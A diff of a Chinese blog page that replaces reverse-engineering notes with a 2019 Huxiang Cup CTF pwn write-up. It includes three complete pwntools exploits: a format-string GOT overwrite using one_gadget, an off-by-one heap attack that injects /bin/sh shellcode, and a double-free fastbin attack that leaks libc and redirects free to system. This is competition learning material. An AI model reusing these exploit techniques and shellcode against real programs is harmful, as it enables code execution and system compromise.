@@ -4,9 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="逆向工程小知识, 时钟">
-    <meta name="description" content="在VB中：vbaVarForInit() , vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环
-MSVBVM50.rtcMsgBox  \\调">
+    <meta name="keywords" content="2019湖湘杯, 时钟">
+    <meta name="description" content="练习赛一共两个pwn，第一个没啥说的，第二个是个格式化，但是由于格式化之前把握不深导致菜的一批，很感谢ditto师傅能够指点一波，看了师傅的博客，受益匪浅。第一个尴尬点：
+我在泄露的时候泄露出了一个(nil)的神奇东西，本来觉得可能是那些限">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@ MSVBVM50.rtcMsgBox  \\调">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>逆向工程小知识 | 时钟</title>
+    <title>2019湖湘杯 | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -246,7 +246,7 @@ MSVBVM50.rtcMsgBox  \\调">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        逆向工程小知识
+                        2019湖湘杯
                     </div>
                 </div>
             </div>
@@ -357,8 +357,8 @@ MSVBVM50.rtcMsgBox  \\调">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/reverse/" target="_blank">
-                                <span class="chip bg-color">reverse</span>
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -369,8 +369,8 @@ MSVBVM50.rtcMsgBox  \\调">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/逆向工程/" class="post-category" target="_blank">
-                                逆向工程
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                CTF题解
                             </a>
                         
                     </div>
@@ -381,21 +381,21 @@ MSVBVM50.rtcMsgBox  \\调">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-02
+                    2019-11-20
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        747
+                        1.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        9 分
                     </div>
                     
                 
@@ -411,43 +411,244 @@ MSVBVM50.rtcMsgBox  \\调">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p>
-<pre><code>MSVBVM50.rtcMsgBox  \\调用消息框
-</code></pre><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br><img src="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p>
-<p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p>
-<p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）</p>
-<ol>
-<li>GOTO 命令（Ctrl+G）然后 F4</li>
-<li>设置断点</li>
-<li>加上注释（快捷键 ; ）</li>
-<li>加上标签 （快捷键 : ）</li>
-</ol>
-<p>快速查找指定代码的四种方法：    </p>
-<ol>
-<li>代码执行法</li>
-<li>字符串检索法</li>
-<li>API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表</li>
-<li>API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</li>
-</ol>
-<p>函数调用约定：<br>  cdecl:<br>    调用者直接清理其压入栈的函数参数<br>   stdcall:<br>    一个使用例子</p>
-<pre><code>#include &quot;stdio.h&quot;
-int _stdcall add(int a ,int b)
-{
-    return a+b;
-}
-int main()
-{
-    return add(1,2);
-}
-</code></pre><p>  这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）<br>  fastcall:<br>  与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</p>
-<ul>
-<li>逆向工程中函数调用的返回值一般保存在eax中，在程序call指令之后一般就会有对eax寄存器的处理，这一点可以用来判断函数的用途和结构</li>
-<li><p>.逆向工程中确定函数参数多少的方法：</p>
-<pre><code>进入函数后可以看到它栈空间中存储的返回地址，通过该返回地址你可以找到调用该函数的起始地址，然后可以分析在进入函数体前后的栈空间大小来确定参数多少
-</code></pre></li>
-<li><p>一些逆向可能会直接在程序内部存在注册码，可以通过找到注册码错误的字符串确定比较注册码正确与否的函数，而在改函数的附近一般会存在正确的注册码。</p>
-</li>
-</ul>
+                <h3 id="练习赛"><a href="#练习赛" class="headerlink" title="练习赛"></a>练习赛</h3><p>一共两个pwn，第一个没啥说的，第二个是个格式化，但是由于格式化之前把握不深导致菜的一批，很感谢ditto师傅能够指点一波，看了师傅的博客，受益匪浅。<br>第一个尴尬点：</p>
+<p>我在泄露的时候泄露出了一个(nil)的神奇东西，本来觉得可能是那些限制了，泄露不出来更多了，但是也没看到程序里面啥限制啊，最后知道了这个原来是null，%p是用来泄露指针的，它返回的地址如果是0x0000这样的，就会返回一个nil给你。</p>
+<p>第二个尬点：我想着程序也没后门，格式化任意写到底该怎么写呢？也没给libc，自然也没想到one_gadget这个神奇的东西，还是师傅强，通过泄露地址知道这个是ubuntu 1604的，然后直接整个libc出来，然后就有one_gadget了。</p>
+<p>第三个，这个如果是我的话，我可能最后会直接劫持printf_got，但是师傅tql，劫持的是printf的返回地址ret,然后劫持到了main函数，同时也劫持了setvbuf函数的got表</p>
+<p>然后最后一个就是：我发现用ubuntu 1604本机的libc可以打通，但是用之前编译好的libc2.23打不通，后来问了大师傅才知道，自己编译的跟本地的还是差很多的，gcc版本，环境等都不太一样。<br>exp:</p>
+<pre><code>#coding=utf-8
+from pwn import *
+exec_binary = &quot;./5c149c66064fa&quot;
+libcversion = &#39;2.23&#39;
+local = 1
+context.binary = exec_binary
+context.log_level = &quot;debug&quot;
+elf = ELF(exec_binary,checksec=False)
+if local:
+    r = process(exec_binary)
+    if context.arch == &quot;i386&quot;:
+        libc = ELF(&quot;/glibc/x86/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)
+    elif context.arch == &quot;amd64&quot;:
+        libc = ELF(&quot;/glibc/x64/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)
+else:
+    r = remote(&quot;183.129.189.60&quot;,10043)
+def get_base(r):
+    text_base = r.libs()[r._cwd+r.argv[0].strip(&#39;.&#39;)]
+    for key in r.libs():
+        if &quot;libc.so.6&quot; in key:
+            return text_base,r.libs()[key]
+def debug():
+    text_base,libc_base = get_base(r)
+    break_point = &quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;
+    break_point+=&#39;&#39;&#39;
+    b *00000000004006DA
+    &#39;&#39;&#39;
+    gdb.attach(r)
+def confirm(address):
+    n = globals()
+    for key,value in n.items():
+        if value == address:
+                return success(key+&quot; ==&gt; &quot;+hex(address))
+offset = 8
+libc = ELF(&#39;./libc.so.6&#39;)
+r.sendline(&quot;%6$p%43$p&quot;)
+stack_addr = int(r.recv(14),16)
+confirm(stack_addr)
+libc_base = int(r.recv(14),16)-240-libc.symbols[&#39;__libc_start_main&#39;]
+confirm(libc_base)
+setvbuf_got = elf.got[&#39;setvbuf&#39;]
+system_addr = libc_base + 0x4526a
+payload=&quot;%&quot; + str(system_addr&amp;0xffff)+&#39;c&#39;+&quot;%10$hn&quot;
+payload=payload.ljust(16,&#39;a&#39;)
+payload+=p64(setvbuf_got)
+#debug()
+r.sendline(payload)
+payload=&quot;%&quot;+str((system_addr&gt;&gt;16)&amp;0xffff)+&#39;c&#39;+&quot;%10$hn&quot;
+payload=payload.ljust(16,&#39;a&#39;)
+payload+=p64(setvbuf_got+2)
+#debug()
+r.sendline(payload)
+ret_addr = stack_addr - 0x210
+confirm(ret_addr)
+main_addr = 0x0000000000400636
+payload = &quot;%&quot; + str(main_addr&amp;0xffff) + &#39;c&#39;+&quot;%10$hn&quot;
+payload=payload.ljust(16,&#39;a&#39;)
+payload+=p64(ret_addr)
+r.sendline(payload)
+r.interactive()
+</code></pre><h3 id="复赛"><a href="#复赛" class="headerlink" title="复赛"></a>复赛</h3><h4 id="Hackone"><a href="#Hackone" class="headerlink" title="Hackone"></a>Hackone</h4><p>首先就是一个off-by-one的漏洞：<br><img src="/2019/11/20/2019-hu-xiang-bei/1.png" title="This is an image"><br>如果刚好输入满堆块的内容，这里的strlen就会把下一个堆块的size位也算进来（strlen是遇到’\0’终止，最终长度不包含’\0’），那么两次edit就会造成off-by-one漏洞<br><img src="/2019/11/20/2019-hu-xiang-bei/2.png" title="This is an image"><br>我们可以溢出一个字节来修改下一个堆块的size位，从而可以overloping，</p>
+<pre><code>#coding=utf-8
+from pwn import *
+exec_binary = &quot;./HackNote&quot;
+libcversion = &#39;2.23&#39;
+local = 1
+context.binary = exec_binary
+context.log_level = &quot;debug&quot;
+elf = ELF(exec_binary,checksec=False)
+if local:
+    r = process(exec_binary)
+    if context.arch == &quot;i386&quot;:
+        libc = ELF(&quot;/glibc/x86/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)
+    elif context.arch == &quot;amd64&quot;:
+        libc = ELF(&quot;/glibc/x64/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)
+else:
+    r = remote(&quot;&quot;)
+def get_base(r):
+    text_base = r.libs()[r._cwd+r.argv[0].strip(&#39;.&#39;)]
+    for key in r.libs():
+        if &quot;libc.so.6&quot; in key:
+            return text_base,r.libs()[key]
+
+def debug(addr):
+    text_base,libc_base = get_base(r)
+    break_point = &quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;
+    break_point+=&quot;b *&quot; + str(addr) + &quot;\nc&quot;
+    gdb.attach(r,break_point)
+
+def confirm(address):
+    n = globals()
+    for key,value in n.items():
+        if value == address:
+            return success(key+&quot; ==&gt; &quot;+hex(address))
+
+def add(size,content):
+    r.sendlineafter(&#39;-----------------\n&#39;,&#39;1&#39;)
+    r.sendlineafter(&#39;nput the Size:\n&#39;,str(size))
+    r.sendafter(&#39;he Note:\n&#39;,content)
+
+def free(idx):
+    r.sendlineafter(&#39;-----------------\n&#39;,&#39;2&#39;)
+    r.sendlineafter(&#39;the Index of Note:\n&#39;,str(idx))
+
+def edit(idx,content):
+    r.sendlineafter(&#39;-----------------\n&#39;,&#39;3&#39;)
+    r.sendlineafter(&#39;Note\n&#39;,str(idx))
+    r.sendafter(&#39;Input the Note:\n&#39;,content)
+__malloc_hook = 0x0000000006CB788
+fake_chunk_addr = 0x6cb772
+add(0x38,&#39;aa\n&#39;) #0
+add(0x38,&#39;aa\n&#39;) #1
+add(0x38,&#39;aa\n&#39;) #2
+add(0x38,&#39;aa\n&#39;) #3
+add(0x38,&#39;aa\n&#39;) #4
+edit(0,&#39;a&#39;*0x38)
+edit(0,&#39;a&#39;*0x38 + &#39;\x81&#39;)
+free(1) 
+add(0x71,&#39;aa\n&#39;) #1
+fake_chunk = [
+    &#39;a&#39;*0x38,0x41,
+    fake_chunk_addr,
+]
+#gdb.attach(r)
+#print flat(fake_chunk)
+free(2)
+edit(1,flat(fake_chunk)+&#39;\n&#39;)
+#gdb.attach(r)
+add(0x38,&#39;aa\n&#39;) #2
+payload = &#39;a&#39; * 6 + p64(__malloc_hook+8) 
+payload+=&#39;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#39;
+add(0x38,payload+&#39;\n&#39;) #5
+r.sendlineafter(&#39;-----------------\n&#39;,&#39;1&#39;)
+r.sendlineafter(&quot;Input the Size:\n&quot;,str(10))    
+#add(0x38,&#39;aa\n&#39;)  #6
+r.interactive()
+</code></pre><h4 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h4><p>还有一个，这个的漏洞是在于<br><img src="/2019/11/20/2019-hu-xiang-bei/3.png" title="This is an image"><br>可以形成double free，比如delete两次18实际上也delete一次19，然后再次delete就可能形成double free，那么就能形成一个指定地址写的操作，再次鸣谢ditto大佬，本来湖湘杯的时候都没看第二题，赛后ditto师傅给了个exp，后来想想还是学习学习，哈哈。</p>
+<pre><code>#coding=utf-8
+from pwn import *
+local = 1
+exec_file=&quot;./NameSystem&quot;
+context.binary=exec_file
+context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf=ELF(exec_file,checksec = False)
+if local :
+    a=process(exec_file)
+    if context.arch == &quot;i386&quot; :
+        libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;,checksec = False)
+    elif context.arch == &quot;amd64&quot; :
+        libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec = False) 
+else:
+    a=remote(&quot;183.129.189.62&quot;,16605)
+
+def get_base(a):
+    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]
+    for key in a.libs():
+        if &quot;libc.so.6&quot; in key:
+            return text_base,a.libs()[key]
+def debug():
+    text_base,libc_base=get_base(a)
+    script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;
+    script+=&#39;&#39;&#39;
+    b *0x000000000400A56
+    b *0x0000000000400B74
+    &#39;&#39;&#39;
+    gdb.attach(a,script)
+def fuck(address):
+    n = globals()
+    for key,value in n.items():
+        if value == address:
+            return success(key+&quot;  ==&gt;  &quot;+hex(address))
+def menu(idx):
+    a.sendlineafter(&quot;Your choice :\n&quot;,str(idx))
+def add(size,content):
+    menu(1)
+    a.sendlineafter(&quot;Name Size:&quot;,str(size))
+    a.sendafter(&quot;Name:&quot;,content)
+
+def delete(idx):
+    menu(3)
+    a.sendlineafter(&quot;The id you want to delete:&quot;,str(idx))
+
+ptr_addr = 0x6020A0
+ptr_end = 0x602138
+fake_chunk_addr = 0x601ffa
+for i in range(15):
+    add(0x28,&#39;A\n&#39;)
+add(0x38,&#39;\n&#39;)#15 
+add(0x58,&#39;\n&#39;)#16 0x603310
+add(0x58,&#39;\n&#39;)#17 0x0000000000603390
+add(0x58,&#39;\n&#39;)#18 0x0000000000603400
+add(0x58,&#39;\n&#39;)#19 0x0000000000603470
+delete(0)
+delete(19)
+delete(17)
+delete(17)
+add(0x38,&#39;\n&#39;)
+add(0x38,&#39;\n&#39;)
+add(0x38,&#39;\n&#39;)
+delete(0)
+delete(19)
+delete(17)
+delete(17)
+add(0x60,&#39;\n&#39;)
+add(0x60,&#39;\n&#39;)
+add(0x60,&#39;\n&#39;)
+delete(0) 
+#delete(0)
+delete(19)   #这里是为了第三次double free
+for i in range(9):
+    delete(0)
+delete(12-4)
+delete(12-4)
+add(0x58,p64(fake_chunk_addr)+&#39;\n&#39;) #把free劫持为puts
+add(0x58,&#39;\n&#39;)
+add(0x58,&#39;\n&#39;)
+add(0x58,&#39;A&#39;*6+p64(0x41)+p64(elf.plt[&quot;puts&quot;])[:6]+&#39;\n&#39;)
+fake_chunk_addr = 0x60208d   #在标准输出流上写一个指针指向puts对应的got表得到puts的真实地址。
+add(0x60,p64(fake_chunk_addr)+&#39;\n&#39;)
+add(0x60,&#39;\n&#39;)
+add(0x60,&#39;\n&#39;)
+add(0x60,&#39;A&#39;*3+p64(0x602020)[:6]+&#39;\n&#39;)
+delete(0)
+libc_base=u64(a.recvuntil(&quot;\n&quot;,drop=True)+&#39;\x00\x00&#39;)-libc.symbols[&quot;puts&quot;]
+fuck(libc_base)
+fake_chunk_addr = 0x000000000602008
+add(0x38,p64(fake_chunk_addr)+&#39;\n&#39;)  #把free改成system
+add(0x38,&#39;\n&#39;)
+add(0x38,&#39;/bin/sh\n&#39;)
+add(0x38,p64(libc_base+libc.symbols[&quot;system&quot;])[:6]+&#39;\n&#39;)
+delete(17)
+a.interactive()
+</code></pre><p>最后说一下，这次湖湘杯真是力不从心，打的菜的一批，继续加油吧。</p>
 
             </div>
             <hr>
@@ -479,9 +680,9 @@ int main()
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《逆向工程小知识》
+                    《2019湖湘杯》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/20/2019-hu-xiang-bei/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -522,42 +723,42 @@ int main()
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/03/glibc-heap-house-of-spirit/">
+                <a href="/2019/11/20/2019-hu-xiang-bei/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="glibc heap House of Spirit">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="2019湖湘杯">
                         
-                        <span class="card-title">glibc heap House of Spirit</span>
+                        <span class="card-title">2019湖湘杯</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这个技术也是针对于fastbin，属于fastbin_attack的一种。关键：目标位置伪造fastbin chunk并将其释放，进而实现在指定地址分配chunk
-关于free时候的检查：
-
-free检查会看size的低字节flag的IS_
+                            练习赛一共两个pwn，第一个没啥说的，第二个是个格式化，但是由于格式化之前把握不深导致菜的一批，很感谢ditto师傅能够指点一波，看了师傅的博客，受益匪浅。第一个尴尬点：
+我在泄露的时候泄露出了一个(nil)的神奇东西，本来觉得可能是那些限
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                    漏洞利用
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                    CTF题解
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -576,33 +777,31 @@ free检查会看size的低字节flag的IS_
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/02/glibc-heap-uaf/">
+                <a href="/2019/11/05/2019i-chun-qiu-da-ti-sai/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="glibc heap UAF">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="2019I春秋答题赛">
                         
-                        <span class="card-title">glibc heap UAF</span>
+                        <span class="card-title">2019I春秋答题赛</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            use after free（UAF）
-
-重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空
+                            PWN2做出来了两个pwn题目（其中一个是复现出来的。。。。）：首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-02
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-05
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                    漏洞利用
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                    CTF题解
                                 </a>
                             
                             
@@ -614,6 +813,10 @@ free检查会看size的低字节flag的IS_
                     
                     <a href="/tags/pwn/" target="_blank">
                         <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/reverse/" target="_blank">
+                        <span class="chip bg-color">reverse</span>
                     </a>
                     
                 </div>
